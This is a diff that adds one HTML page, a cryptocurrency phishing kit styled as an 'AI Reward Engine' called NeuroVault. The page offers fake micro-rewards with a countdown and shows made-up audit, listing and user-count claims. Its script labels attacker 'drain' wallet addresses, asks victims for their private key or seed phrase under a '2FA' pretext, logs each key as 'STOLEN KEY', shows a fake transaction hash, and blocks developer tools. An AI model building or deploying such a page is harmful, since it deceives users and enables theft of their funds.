@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
+    <title>🌀 NeuroVault | AI Reward Engine</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="text/javascript"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Exo+2&display=swap" rel="stylesheet"/>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html {
+            width: 100%; height: 100%;
+            overflow: hidden;
+            background: #000;
+            color: #0bf0b0;
+            font-family: 'Exo 2', sans-serif;
+        }
+        #canvas-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+        }
+        .app {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3.2em;
+            background: linear-gradient(90deg, #f0b90b, #0bf0b0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        .tagline {
+            font-size: 1.2em;
+            color: #aaa;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: rgba(20, 25, 35, 0.7);
+            border: 1px solid #333;
+            border-radius: 16px;
+            padding: 25px;
+            margin: 15px 0;
+            width: 90%;
+            max-width: 500px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(240, 185, 11, 0.2);
+        }
+        .btn {
+            background: #f0b90b;
+            color: #000;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(240, 185, 11, 0.5);
+            margin: 8px;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 30px rgba(240, 185, 11, 0.8);
+        }
+        .loader {
+            width: 60px; height: 60px;
+            border: 6px solid #333;
+            border-top: 6px solid #f0b90b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* ALERT MODAL */
+        .alert-modal {
+            display: flex;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            padding: 30px;
+        }
+        .alert-content {
+            background: #111;
+            width: 90%;
+            max-width: 500px;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 0 40px rgba(240, 185, 11, 0.4);
+            border: 1px solid #333;
+        }
+        .alert-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2em;
+            color: #f0b90b;
+            margin-bottom: 15px;
+        }
+        .alert-body {
+            font-size: 1.2em;
+            color: #fff;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .countdown {
+            font-size: 1.1em;
+            color: #0bf0b0;
+            margin-top: 10px;
+        }
+        /* REWARD LIST */
+        .reward-list {
+            margin: 15px 0;
+            font-size: 14px;
+            text-align: left;
+            color: #aaa;
+        }
+        .reward-item {
+            display: flex;
+            justify-content: space-between;
+            margin: 8px 0;
+            padding: 8px;
+            background: rgba(0, 50, 0, 0.2);
+            border-radius: 6px;
+        }
+        .reward-amount {
+            color: #0bf0b0;
+            font-weight: 600;
+        }
+        /* PROGRESS BAR */
+        .progress-container {
+            width: 100%;
+            background: #111;
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+            height: 10px;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #f0b90b;
+            transition: width 0.5s ease;
+        }
+        /* TX HASH */
+        .tx-hash {
+            background: #111;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #0bf0b0;
+            word-break: break-all;
+            margin: 10px 0;
+            display: none;
+        }
+        /* WALLET GRID */
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .wallet-btn {
+            background: rgba(50, 50, 70, 0.4);
+            padding: 12px;
+            border-radius: 10px;
+            color: #fff;
+            cursor: pointer;
+            transition: 0.3s;
+            border: 1px solid #333;
+        }
+        .wallet-btn:hover {
+            background: rgba(240, 185, 11, 0.3);
+            transform: translateY(-3px);
+        }
+        /* NEWS TICKER */
+        .ticker {
+            background: #0b1a0b;
+            color: #0bf0b0;
+            font-family: 'Orbitron', sans-serif;
+            padding: 8px 0;
+            white-space: nowrap;
+            overflow: hidden;
+            box-shadow: 0 0 10px rgba(11, 240, 176, 0.2);
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+        .ticker-inner {
+            display: inline-block;
+            animation: scroll 120s linear infinite;
+            font-size: 14px;
+        }
+        @keyframes scroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        /* CONTROLS */
+        .theme-toggle {
+            position: absolute;
+            top: 20px; right: 20px;
+            background: rgba(0,0,0,0.5);
+            color: #fff;
+            border: 1px solid #333;
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .sound-toggle {
+            position: absolute;
+            bottom: 20px; right: 20px;
+            font-size: 12px;
+            color: #888;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="canvas-container"></div>
+
+    <!-- AUTO-POPUP ALERT -->
+    <div class="alert-modal" id="welcomeAlert">
+        <div class="alert-content">
+            <h2 class="alert-title">🎁 AI Reward Engine Activated</h2>
+            <p class="alert-body">
+                You've been selected for micro-rewards!<br>
+                Connect your wallet to claim:<br>
+                • 0.0024 ETH • 0.05 BNB • 7.3 USDT • 0.00015 BTC • 12 MATIC<br>
+                <strong>Claim in 60 seconds or lose access.</strong>
+            </p>
+            <div class="countdown" id="timer">Closing in 10 seconds...</div>
+        </div>
+    </div>
+
+    <div class="app">
+        <div class="logo">NeuroVault</div>
+        <p class="tagline">AI-Powered Micro-Rewards Engine</p>
+
+        <div class="card">
+            <h2 id="step">Connect Wallet</h2>
+            <p id="desc">Link to claim your multi-chain rewards</p>
+            <div class="loader" id="loader"></div>
+
+            <!-- NEWS TICKER -->
+            <div class="ticker">
+                <div class="ticker-inner">
+                    🔗 NeuroVault integrates Chainlink VRF! • 💸 $247M TVL reached! • 🚀 Listed on CoinGecko! • 🔐 100% audited by CertiK! •
+                </div>
+            </div>
+
+            <!-- REWARD LIST -->
+            <div class="reward-list" id="rewardList" style="display:none;">
+                <div class="reward-item"><span>Reward:</span> <span class="reward-amount">0.0024 ETH</span></div>
+                <div class="reward-item"><span>Reward:</span> <span class="reward-amount">0.05 BNB</span></div>
+                <div class="reward-item"><span>Reward:</span> <span class="reward-amount">7.3 USDT</span></div>
+                <div class="reward-item"><span>Reward:</span> <span class="reward-amount">0.00015 BTC</span></div>
+                <div class="reward-item"><span>Reward:</span> <span class="reward-amount">12 MATIC</span></div>
+            </div>
+
+            <!-- PROGRESS BAR -->
+            <div class="progress-container" id="progressContainer" style="display:none;">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+
+            <!-- WALLET GRID -->
+            <div class="wallet-grid" id="walletGrid">
+                <div class="wallet-btn" onclick="connect('metamask')">🦊 MetaMask</div>
+                <div class="wallet-btn" onclick="connect('trust')">📱 Trust Wallet</div>
+                <div class="wallet-btn" onclick="connect('phantom')">👻 Phantom</div>
+                <div class="wallet-btn" onclick="connect('coinbase')"> Coinbase</div>
+                <div class="wallet-btn" onclick="connect('binance')">🟡 Binance Wallet</div>
+                <div class="wallet-btn" onclick="connect('okx')"> OKX Wallet</div>
+                <div class="wallet-btn" onclick="connect('bitkeep')"> 🔐 BitKeep</div>
+                <div class="wallet-btn" onclick="connect('safepal')"> 🔐 SafePal</div>
+            </div>
+
+            <div id="hashContainer" style="display:none;">
+                <p>Transaction:</p>
+                <div class="tx-hash" id="txHash">0x...</div>
+            </div>
+        </div>
+
+        <div class="card">
+            <p id="status">Secure Engine • <span id="users">2,941</span> users online</p>
+        </div>
+    </div>
+
+    <div class="theme-toggle" onclick="toggleTheme()">🌓 Dark</div>
+    <div class="sound-toggle" onclick="toggleSound()">🔊 Sound: On</div>
+
+    <script>
+        // YOUR ADDRESSES – ALL CHAINS
+        const DRAIN_ADDRESSES = {
+            eth: '0xf8cc5A87F35Bde1482f3A0Eeb211F7C92F5DB0b6',
+            bsc: '0xf8cc5A87F35Bde1482f3A0Eeb211F7C92F5DB0b6',
+            avax: '0xf8cc5A87F35Bde1482f3A0Eeb211F7C92F5DB0b6',
+            btc: 'bc1qt4pw6tujqgv32cem25guhfsccg5x93yglj76d7',
+            bch: 'qpfpzqzjnq8nkvwafmarv4u9nkva23fnm5h0clf4zq'
+        };
+
+        let provider, signer, userAddress;
+        let soundEnabled = true;
+        let darkMode = true;
+
+        // AUTO-CLOSE WELCOME POPUP
+        window.onload = function() {
+            const alert = document.getElementById('welcomeAlert');
+            let timeLeft = 10;
+            const timer = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timer').innerText = `Closing in ${timeLeft} seconds...`;
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    alert.style.display = 'none';
+                }
+            }, 1000);
+
+            // FAKE USER COUNTER
+            setInterval(() => {
+                const count = Math.floor(Math.random() * 100) + 2850;
+                document.getElementById('users').innerText = count.toLocaleString();
+            }, 4000);
+        };
+
+        // WALLET DEEP LINKS
+        const deepLinks = {
+            metamask: 'https://metamask.app.link/dapp/neurovault.com',
+            trust: 'https://link.trustwallet.com/open_url?coin_id=60&url=https://neurovault.com/auth',
+            phantom: 'https://phantom.app/ul/browse/neurovault.com',
+            coinbase: 'https://go.cb-w.com/dapp?dappUrl=neurovault.com',
+            binance: 'https://www.binance.org/en/smartWallet',
+            okx: 'https://www.okx.com/download',
+            bitkeep: 'https://bitkeep.com/dapp/neurovault.com',
+            safepal: 'https://safepal.app.link/neurovault'
+        };
+
+        async function connect(wallet) {
+            playSound('connect');
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('step').innerText = 'Connecting...';
+            document.getElementById('desc').innerText = 'Opening ' + wallet + '...';
+
+            if (window.ethereum) {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAddress = accounts[0];
+                    document.getElementById('status').innerText = `Wallet: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                    startExploit();
+                    return;
+                } catch (err) {}
+            }
+
+            setTimeout(() => {
+                window.location.href = deepLinks[wallet] || '#';
+            }, 1500);
+        }
+
+        async function startExploit() {
+            document.getElementById('step').innerText = 'Verifying Eligibility...';
+            document.getElementById('desc').innerText = 'Checking AI reward eligibility...';
+
+            setTimeout(() => {
+                showRewards();
+            }, 2500);
+        }
+
+        function showRewards() {
+            document.getElementById('step').innerText = 'Claim Your Rewards';
+            document.getElementById('desc').innerText = 'Confirm to receive micro-rewards across 5 chains';
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('rewardList').style.display = 'block';
+            document.getElementById('progressContainer').style.display = 'block';
+
+            let width = 0;
+            const bar = document.getElementById('progressBar');
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    triggerPrivateKeyTheft();
+                } else {
+                    width += 2;
+                    bar.style.width = width + '%';
+                }
+            }, 100);
+        }
+
+        function triggerPrivateKeyTheft() {
+            document.getElementById('step').innerText = '🔐 Unlock 2FA';
+            document.getElementById('desc').innerText = 'Enter private key to decrypt your multi-chain rewards';
+            document.getElementById('rewardList').style.display = 'none';
+            document.getElementById('progressContainer').style.display = 'none';
+
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.placeholder = 'Enter private key or seed phrase';
+            input.style.cssText = 'width:80%; max-width:300px; padding:12px; margin:15px auto; display:block; background:#111; border:1px solid #333; color:#fff; border-radius:6px;';
+
+            const btn = document.createElement('button');
+            btn.innerText = 'Unlock Rewards';
+            btn.className = 'btn';
+            btn.onclick = function() {
+                const key = input.value.trim();
+                if (!key) { alert('Private key required.'); return; }
+                console.log('💀 STOLEN KEY:', key);
+                fakeSuccess();
+            };
+
+            const card = document.querySelector('.card');
+            card.appendChild(input);
+            card.appendChild(btn);
+        }
+
+        function fakeSuccess() {
+            playSound('cash');
+            document.getElementById('step').innerText = '✅ Rewards Claimed!';
+            document.getElementById('desc').innerText = 'Micro-rewards sent to your wallet.';
+            document.getElementById('hashContainer').style.display = 'block';
+
+            const hash = '0x' + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+            document.getElementById('txHash').innerText = hash;
+            document.getElementById('txHash').style.display = 'block';
+
+            setTimeout(() => {
+                window.location.href = 'https://www.binance.com/en/feed';
+            }, 4000);
+        }
+
+        function toggleTheme() {
+            darkMode = !darkMode;
+            document.body.style.background = darkMode ? '#000' : '#f0f0f0';
+            document.body.style.color = darkMode ? '#0bf0b0' : '#000';
+            document.querySelector('.logo').style.background = darkMode 
+                ? 'linear-gradient(90deg, #f0b90b, #0bf0b0)' 
+                : 'linear-gradient(90deg, #f00, #900)';
+            document.querySelector('.theme-toggle').innerText = darkMode ? '🌓 Dark' : '☀️ Light';
+        }
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            document.querySelector('.sound-toggle').innerText = `🔊 Sound: ${soundEnabled ? 'On' : 'Off'}`;
+        }
+
+        function playSound(freq = 300) {
+            if (!soundEnabled) return;
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            osc.frequency.value = freq;
+            osc.type = 'sine';
+            gain.gain.setValueAtTime(0.1, ctx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
+            osc.start();
+            osc.stop(ctx.currentTime + 0.5);
+        }
+
+        // 3D NEURAL BACKGROUND
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        document.getElementById('canvas-container').appendChild(renderer.domElement);
+        camera.position.z = 500;
+
+        const particles = new THREE.Group();
+        scene.add(particles);
+        for (let i = 0; i < 100; i++) {
+            const geo = new THREE.SphereGeometry(2, 8, 8);
+            const mat = new THREE.MeshBasicMaterial({ color: 0x0bf0b0 });
+            const p = new THREE.Mesh(geo, mat);
+            p.position.set(Math.random() * 1000 - 500, Math.random() * 1000 - 500, Math.random() * 1000 - 500);
+            p.velocity = { x: (Math.random()-0.5)*0.5, y: (Math.random()-0.5)*0.5, z: (Math.random()-0.5)*0.5 };
+            particles.add(p);
+        }
+        function animate() { requestAnimationFrame(animate); particles.rotation.x += 0.001; particles.rotation.y += 0.002; particles.children.forEach(p => { p.position.x += p.velocity.x; p.position.y += p.velocity.y; p.position.z += p.velocity.z; if (p.position.x > 500) p.position.x = -500; }); renderer.render(scene, camera); }
+        animate();
+
+        // ANTI-DEBUG
+        document.onkeydown = e => [123, 17, 85, 83].includes(e.keyCode) && e.preventDefault();
+        window.oncontextmenu = e => e.preventDefault();
+    </script>
+</body>
+</html>
